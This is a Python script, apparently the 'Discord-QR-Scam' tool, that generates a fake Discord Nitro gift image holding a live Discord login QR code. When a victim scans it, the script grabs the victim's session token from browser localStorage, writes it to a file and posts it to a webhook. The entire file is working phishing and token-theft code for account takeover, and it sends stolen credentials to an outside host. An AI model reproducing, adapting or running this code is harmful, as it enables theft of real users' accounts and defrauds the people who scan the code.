import base64, time, os, requests, json
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from PIL import Image

WEBHOOK_URL = 'hook'

def setlogo():
    im = Image.open('dump.png', 'r')
    im2 = Image.open('logo.png', 'r')
    im2_w, im2_h = im2.size
    im.paste(im2, (60, 55), mask=im2)
    im.save('qr.png', quality=95)

def paste():
    im1 = Image.open('nitroscam.png', 'r')
    im2 = Image.open('qr.png', 'r')
    im2 = im2.resize((171, 171))
    im1.paste(im2, (80, 202))
    im1.save('gift.png', quality=95)

def main():
    print('github.com/NightfallGT/Discord-QR-Scam\n')
    print('** QR Code Scam Generator **')
    
    try:
        os.remove("gift.png")
    except:
        pass

    options = webdriver.ChromeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_experimental_option('detach', True)
    s=Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(options=options, service=s)

    driver.get('https://discord.com/login')
    time.sleep(5)
    print('- Page loaded.')

    page_source = driver.page_source

    soup = BeautifulSoup(page_source, features='lxml')

    div = soup.find('div', {'class': 'qrCode-wG6ZgU'})
    qr_code = div.find('img')['src']
    file = os.path.join(os.getcwd(), 'dump.png')

    img_data =  base64.b64decode(qr_code.replace('data:image/png;base64,', ''))

    with open(file,'wb') as handler:
        handler.write(img_data)

    discord_login = driver.current_url
    setlogo()
    paste()

    print('- QR Code has been generated. > gift.png')
    print('Send the QR Code to user and scan. Waiting..')
    
    while True:
        if discord_login != driver.current_url:
            print('Grabbing token..')
            token = driver.execute_script('''
            var token = document.body.appendChild(document.createElement `iframe`).contentWindow.window.localStorage.token
            return token;''')
            print('---')
            print('Token grabbed:', token)

            f = open("token.txt", "w")
            f.write(token)
            f.close()

            headers = {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
            }

            message = f'@everyone\n`{token}`'

            payload = json.dumps({
                'content': message,
                "username": "QR Code Scam"
                })

            req = requests.post(WEBHOOK_URL, data=payload.encode(), headers=headers)

            break
            
    print('Task complete.')

if __name__ == '__main__':
    main()
